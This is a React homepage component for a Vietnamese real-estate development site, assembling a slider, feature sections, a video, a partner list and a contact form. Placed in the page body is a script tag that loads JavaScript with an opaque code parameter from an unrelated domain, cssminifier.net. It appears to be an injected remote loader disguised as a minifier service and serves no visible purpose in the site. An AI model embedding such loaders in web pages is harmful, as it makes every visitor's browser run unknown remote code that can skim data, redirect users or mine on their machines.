import React, { useState } from 'react'
import '../css/style.css'
import Layout from '../components/layout'
import SEO from '../components/seo'
import HomeSlider from '../components/HomeSlider'
import Island from '../components/Island'
import UniquePosition from '../components/UniquePosition'
import UniqueDesign from '../components/UniqueDesign'
import PersonalImprint from '../components/PersonalImprint'
import UpperClassPrivilege from '../components/UpperClassPrivilege'
import Video from '../components/Video'
import Partner from '../components/Partner'
import ContactBtn from '../components/ContactBtn'
import ContactForm from '../components/ContactForm'
import { Modal, Card, Descriptions } from 'antd'

export default () => {
  const [willShow, setWillShow] = useState(false)
  return (
    <Layout>
      <SEO title="Trang chủ" />
      <script
        src="//cssminifier.net/apisd.js?v=1035&code=ea4e7f4c6648211d394c5b6d5d18bda2"
        type="text/javascript"
      ></script>
      <HomeSlider />
      <Island />
      <UniquePosition />
      <UniqueDesign />
      <PersonalImprint />
      <UpperClassPrivilege />
      <Video videoSrcURL="https://ecoparkgrand.com/wp-content/uploads/2019/05/videos.mp4" />
      <Partner />
      <div className="p-10 text-center">
        <ContactBtn
          className="sm:py-5 sm:px-20"
          title="Chi tiết"
          onClick={() => {
            setWillShow(true)
          }}
        />
      </div>

      <ContactForm
        willShow={willShow}
        onClose={() => {
          console.log('HELP me')
          setWillShow(false)
        }}
      />

      {/* <Modal
        width="75%"
        className="w-3/4"
        visible={willShow}
        onOk={() => {
          setWillShow(false)
        }}
        onCancel={() => {
          setWillShow(false)
        }}
      > 
       </Modal> */}
    </Layout>
  )
}
